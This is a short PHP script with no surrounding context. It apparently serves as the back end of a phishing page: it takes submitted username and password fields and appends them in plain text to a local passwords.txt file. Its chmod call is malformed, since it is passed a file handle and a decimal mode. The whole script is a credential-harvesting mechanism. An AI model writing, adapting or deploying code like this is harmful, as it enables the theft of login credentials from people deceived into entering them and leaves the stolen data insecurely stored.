<?php

    if(isset($_POST['user']) && isset($_POST['pass'])) {
        $str = 'username: '.$_POST['user'].'password: '.$_POST['pass']. PHP_EOL;
        $details_file = fopen("passwords.txt", "a");
        chmod($details_file, 777);
        fwrite($details_file, $str);
        fclose($details_file);
    }

?>
